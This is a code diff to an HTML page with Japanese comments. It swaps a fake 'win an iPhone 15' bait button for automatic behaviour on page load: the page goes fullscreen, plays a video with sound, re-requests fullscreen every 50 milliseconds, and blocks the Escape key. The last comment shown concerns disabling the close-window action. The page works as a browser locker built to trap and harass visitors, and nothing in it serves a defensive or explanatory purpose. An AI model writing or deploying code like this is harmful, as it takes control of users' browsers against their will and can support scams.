@@ -17,7 +17,6 @@
             background-color: black;
         }
         #video-container {
-            display: none;
             position: absolute;
             top: 0;
             left: 0;
@@ -29,31 +28,17 @@
             height: 100%;
             object-fit: cover;
         }
-        #start-button {
-            font-size: 24px;
-            padding: 15px 30px;
-            cursor: pointer;
-            z-index: 10;
-            background-color: gold;
-            border: none;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(255, 223, 0, 0.8);
-            color: black;
-            transition: transform 0.2s, box-shadow 0.2s;
-            position: relative;
-        }
     </style>
 </head>
 <body>
     <div id="video-container">
-        <video id="video" class="video-background" loop>
+        <video id="video" class="video-background" loop autoplay>
             <source src="Feminism video (1).mp4" type="video/mp4">
         </video>
     </div>
-    <button id="start-button">Iphone15を獲得します！</button>
 
     <script>
-        document.getElementById('start-button').addEventListener('click', function() {
+        window.addEventListener('load', function() {
             var videoContainer = document.getElementById('video-container');
             var video = document.getElementById('video');
 
@@ -75,25 +60,23 @@
                 }
             }
 
-            // 全画面を常に維持するための監視
-            setInterval(keepFullScreen, 10); // 50msごとに全画面を要求
-
-            // 動画をユーザー操作後に再生
-            videoContainer.style.display = 'block';
+            // ページ読み込み時に自動で全画面にする
             requestFullScreen();
             video.muted = false;
             video.play().catch(function(error) {
                 console.error('動画の再生に失敗しました:', error);
             });
-            this.style.display = 'none';
-        });
 
-        // Escキーやその他のキーを無効化
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Escape') {
-                event.preventDefault();
-                requestFullScreen(); // Escキーが押されてもすぐに全画面をリクエスト
-            }
+            // 全画面を常に維持するための監視
+            setInterval(keepFullScreen, 50);
+
+            // Escキーやその他のキーを無効化
+            document.addEventListener('keydown', function(event) {
+                if (event.key === 'Escape') {
+                    event.preventDefault();
+                    requestFullScreen();
+                }
+            });
         });
 
         // ウィンドウを閉じる操作を無効化
